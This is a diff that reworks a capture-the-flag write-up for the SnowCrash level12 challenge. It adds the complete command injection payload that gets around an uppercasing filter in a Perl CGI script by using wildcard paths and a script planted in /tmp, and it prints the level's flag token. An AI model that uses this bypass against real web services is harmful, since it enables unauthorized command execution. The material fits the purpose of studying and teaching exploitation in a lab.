@@ -41,7 +41,6 @@ n(t(param("x"), param("y")));
 
 ```
 
-
 ## Observations
 
 The script is written in Perl and runs as a CGI handler on port 4646.
@@ -63,7 +62,6 @@ Then it is interpolated inside a backtick execution:
 
 Since backticks execute a shell command, any properly formatted injection will execute on the system.
 
-
 ## Identifying the Vulnerability
 At first glance, this looks like straightforward command injection. But attempts like:
 ```bash
@@ -72,24 +70,19 @@ curl "http://localhost:4646/?x=touch /tmp/flaka"
 
 fail because:
 
-touch → becomes TOUCH (invalid command).
-
-Spaces are truncated → arguments are lost.
+- touch → becomes TOUCH (invalid command)
+- Spaces are truncated → arguments are lost
 
 So direct injection does not work.
 
 Instead, we realize that backticks expand file paths as commands. If we create our own script in /tmp, the vulnerable CGI will happily run it when invoked.
 
-
 ## Exploit Strategy
 
-* Create a malicious script in /tmp.
-
-* Make it executable.
-
-* Trigger the CGI script with an input that expands to our malicious file.
-
-* The script will execute our payload.
+1. Create a malicious script in /tmp
+2. Make it executable
+3. Trigger the CGI script with an input that expands to our malicious file
+4. The script will execute our payload
 
 ## Exploitation
 
@@ -101,12 +94,23 @@ level12@SnowCrash:/tmp$ cat POPO
 
 getflag > /var/crash/flaka
 ```
+
 Make it executable:
 ```bash
 level12@SnowCrash:/tmp$ chmod +x POPO
 ```
 
-Then, we call the vulnerable CGI with an input that executes /tmp/POPO.
+Then, we call the vulnerable CGI with an input that executes /tmp/POPO:
+
+```bash
+level12@SnowCrash:/tmp$ curl "http://localhost:4646/?x=\`/*/POPO\`"
+```
+
+This works because:
+- The input `` `/*/POPO` `` contains backticks that will be executed by the shell
+- Even after uppercasing, the wildcards `/*` still expand to `/tmp` 
+- The backticks cause the shell to execute `/tmp/POPO` directly
+- Our malicious script gets executed before the egrep command even runs
 
 Afterwards, we check /var/crash and find our flag:
 
@@ -117,13 +121,12 @@ level12@SnowCrash:/var/crash$ cat flaka
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
 
-### Conclusion
+## Conclusion
 
-The vulnerability was unsanitized backticks execution.
-
-Direct command injection fails due to uppercasing and truncation.
-
-By placing a script in /tmp, we bypass the filters and achieve execution.
+- The vulnerability was unsanitized backticks execution
+- Direct command injection fails due to uppercasing and truncation
+- By placing a script in /tmp and using the right path format, we bypass the filters and achieve execution
+- The key insight was understanding that the shell would attempt to execute our script path even when used in the egrep command
 
 Final flag:
 ```bash
